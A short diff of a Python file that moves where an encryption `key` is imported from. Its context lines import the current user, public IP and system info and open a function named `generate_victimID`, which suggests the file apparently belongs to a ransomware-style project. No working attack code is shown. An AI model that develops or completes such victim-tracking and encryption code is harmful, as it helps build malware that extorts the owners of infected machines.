@@ -2,7 +2,7 @@ import random
 import string
 import requests
 from encrypt import current_user,public_ip,system_info
-from main import key
+from encrypt import key
 
 def generate_victimID():
  result = []
